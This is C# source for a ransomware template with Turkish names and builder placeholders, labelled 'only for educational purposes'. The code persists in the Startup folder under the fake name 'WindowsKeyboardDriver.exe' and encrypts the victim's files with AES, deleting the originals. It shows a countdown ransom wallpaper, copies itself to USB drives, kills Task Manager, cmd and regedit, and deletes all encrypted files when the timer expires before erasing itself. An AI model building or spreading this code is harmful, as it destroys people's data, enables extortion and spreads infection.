using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Globalization;
using System.Net;
using System.Security.Cryptography;           //WARNING! ONLY FOR EDUCATIONAL PURPOSES! MADE IN TURKEY
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Media;
namespace crypt_engine
{
    public partial class Form1 : Form
    {
        
        DateTime now;
        public string delete_Time = "TIMEDELETE";
		public string days = "DAYSNUM";
        DateTime left;
        public static string imha = "DEGER";
		string[] dizins;
		public string usb_spread = "USBSPREAD";
		public string blocking = "BLOCK";
		public string startt = "BASLANGIC";
        public Form1()
        {
            InitializeComponent();
			 if(startt == "1"){
				 
	        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\WindowsKeyboardDriver.exe"))
              {
                File.Move(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\WindowsKeyboardDriver.exe");
                System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\WindowsKeyboardDriver.exe");
                Environment.Exit(0);
              }
			 }
			 string[] resourceNames = GetType().Assembly.GetManifestResourceNames();
            foreach (string resourceName in resourceNames)
            {
				if(resourceName.Contains("jpg")){
					
                     var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    using (var stream = assembly.GetManifestResourceStream(resourceName))
                    {
					
                        byte[] buffer = new byte[stream.Length];
                        stream.Read(buffer, 0, buffer.Length);
                        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\wallpaper.jpg",buffer); 					
                    }
				}
				else if(resourceName.Contains("wav")){
					
                     var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    using (var stream = assembly.GetManifestResourceStream(resourceName))
                    {
					
                        byte[] buffer = new byte[stream.Length];
                        stream.Read(buffer, 0, buffer.Length);
						using (MemoryStream ms = new MemoryStream(buffer))
                        {
   
                        SoundPlayer player = new SoundPlayer(ms);
                        player.Play();
                        }
                        //File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\wallpaper.jpg",buffer); 					
                    }
				}
				if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\backup_wall.jpg")){
					
				File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\backup_wall.jpg");
				
				}
		   }
			
            if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\settings.setting")){
			DateTime baslangic = DateTime.Now.ToLocalTime();
            DateTime bitis = baslangic.AddDays(int.Parse(days));
			delete_Time = bitis.ToString("HH:mm:ss dd/MM/yyyy");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\settings.setting",delete_Time);
			}
			else{
				
			delete_Time = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\settings.setting");
			}
			
            left = new DateTime(int.Parse(delete_Time.Split(' ')[1].Split('.')[2]), int.Parse(delete_Time.Split(' ')[1].Split('.')[1])
            , int.Parse(delete_Time.Split(' ')[1].Split('.')[0]), int.Parse(delete_Time.Split(' ')[0].Split(':')[0]),
             int.Parse(delete_Time.Split(' ')[0].Split(':')[1]), int.Parse(delete_Time.Split(' ')[0].Split(':')[2]));        
             dizins = new string[] { HANGIDIZINLER };		 
             Crypt(dizins, new string[] { @HANGIUZANTILER }, @"PASSWORD", @".UZANTICRYPT");		 
             richTextBox1.Text = @"MESAJ";
                       
            timer1.Start();
            if (imha == "EVET")
            {
                imha_zamani();
            }
			if(usb_spread == "1"){
				
				timer2.Enabled = true;
				timer2.Start();
			
			}
			if(blocking == "1"){
				
				timer3.Enabled = true;
				timer3.Start();
			
			}
        }
		public void dosyalari_sil()
        {
            for (int x = 0; x < dizins.Length; x++)
            {
                    
                    if (Directory.Exists(dizins[x]))
                    {
						try{
                        DirectoryInfo f = new DirectoryInfo(dizins[x]);
                        FileInfo[] d = f.GetFiles("*.UZANTICRYPT", SearchOption.AllDirectories);
                        foreach (FileInfo v in d)
                        {

                        File.Delete(v.FullName);
                        }
						}
						catch(Exception){}
                    }
                }
            
        }
        TimeSpan duration;
        private void timer1_Tick(object sender, EventArgs e)
        {
			if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\delete_program.del")){
				try{
				CenterScreen.SetBackgroud(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\backup_wall.jpg");
				}catch(Exception){}
				timer3.Stop();
				imha_zamani();
			}
			else{
            string s = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
            var c = DateTime.ParseExact(s, "dd/MM/yyyy HH:mm:ss", null);
            now = new DateTime(c.Year, c.Month, c.Day, c.Hour, c.Minute, c.Second);
            duration  = left - now;
            label1.Text = duration.ToString();
            try
            {
                using (Image i = new Bitmap(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\wallpaper.jpg"))
                {
                    using (Graphics g = Graphics.FromImage(i))
                    {

                        Font f = new Font("Microsoft Sans Serif", 36F, FontStyle.Bold, GraphicsUnit.Point, 162);
                        Point p= new Point((Screen.PrimaryScreen.Bounds.Size.Width / 2), (Screen.PrimaryScreen.Bounds.Size.Height / 2));
                        StringFormat sf = new StringFormat();
                        sf.Alignment = StringAlignment.Center;
                        g.DrawString(groupBox1.Text+"\n"+label1.Text+"\n"+ richTextBox1.Text, f, Brushes.Red, p.X + 300,p.Y,sf);
                        i.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\wallpaper.jpg");
                        CenterScreen.SetBackgroud(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\wallpaper.jpg");                    
                    }
                }
            }catch(Exception) {  }
            if(label1.Text == "00:00:00" || label1.Text.Contains("-"))
            {
				try
            {
                using (Image i = new Bitmap(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\wallpaper.jpg"))
                {
                    using (Graphics g = Graphics.FromImage(i))
                    {

                        Font f = new Font("Microsoft Sans Serif", 36F, FontStyle.Bold, GraphicsUnit.Point, 162);
                        Point p= new Point((Screen.PrimaryScreen.Bounds.Size.Width / 2), (Screen.PrimaryScreen.Bounds.Size.Height / 2));
                        StringFormat sf = new StringFormat();
                        sf.Alignment = StringAlignment.Center;
                        g.DrawString("All files deleted :(", f, Brushes.Red, p.X + 300,p.Y,sf);
                        i.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\wallpaper.jpg");
                        CenterScreen.SetBackgroud(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\wallpaper.jpg");                    
                    }
                }
            }catch(Exception) {  }
                timer1.Stop();
				dosyalari_sil();
				MessageBox.Show("Your Files were deleted!! good bye!","Exc",MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
				imha_zamani();
                
            }
		}
        }
        public static void imha_zamani()
        {
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\settings.setting");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\delete_program.del");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\main.ico");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\wallpaper.jpg");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\wallpaper.jpg");
            Process.Start(new System.Diagnostics.ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + System.Reflection.Assembly.GetExecutingAssembly().Location,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Environment.Exit(0);
        }
		private void timer2_Tick(object sender, EventArgs e)
        {
            DriveInfo[] usb_diskler = DriveInfo.GetDrives();

            foreach (DriveInfo usb_disk in usb_diskler)
            {
                if (usb_disk.DriveType == DriveType.Removable)
                {
					if(!File.Exists(usb_disk.Name+"USBNAME")){
                    File.Copy(Application.ExecutablePath, usb_disk.Name+"USBNAME");
					}
                }
            }
        }
        private static void Crypt(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi)
        {
            for (int x = 0; x < dizin.Length; x++)
            {
                for (int c = 0; c < uzantilar.Length; c++)
                {
                    if (Directory.Exists(dizin[x]))
                    {
                        DirectoryInfo f = new DirectoryInfo(dizin[x]);
                        FileInfo[] d = f.GetFiles("*." + uzantilar[c], SearchOption.AllDirectories);
                        foreach (FileInfo v in d)
                        {

                            Encrypt(v.FullName, v.FullName + crypt_uzantisi, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });

                        }

                    }
                }
            }
        }
		private void timer3_Tick(object sender, EventArgs e)
        {
            try
            {
                if(Process.GetProcessesByName("taskmgr").Length > 0){
					
					Process.GetProcessesByName("taskmgr")[0].Kill();
				}
                 if(Process.GetProcessesByName("cmd").Length > 0){
					
					Process.GetProcessesByName("cmd")[0].Kill();
				}
                 if(Process.GetProcessesByName("msconfig").Length > 0){
					
					Process.GetProcessesByName("msconfig")[0].Kill();
				}
				 if(Process.GetProcessesByName("ProcessHacker").Length > 0){
					
					Process.GetProcessesByName("ProcessHacker")[0].Kill();
				}
				if(Process.GetProcessesByName("regedit").Length > 0){
					
					Process.GetProcessesByName("regedit")[0].Kill();
				}
				
            }
            catch (Exception) {}
        }
		 private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Visible = false;
			e.Cancel = true;
        }
        private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
        {

            try
            {
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
                string cryptFile = outputFile;
                FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

                RijndaelManaged AES = new RijndaelManaged();

                AES.KeySize = 256;
                AES.BlockSize = 128;


                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);
                AES.Padding = PaddingMode.Zeros;

                AES.Mode = CipherMode.CBC;

                CryptoStream cs = new CryptoStream(fsCrypt,
                     AES.CreateEncryptor(),
                    CryptoStreamMode.Write);

                FileStream fsIn = new FileStream(inputFile, FileMode.Open);

                int data;
                while ((data = fsIn.ReadByte()) != -1)
                    cs.WriteByte((byte)data);


                fsIn.Close();
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);
            }
            catch (Exception ex) { Console.WriteLine(ex.Message); }
        }
    }
}
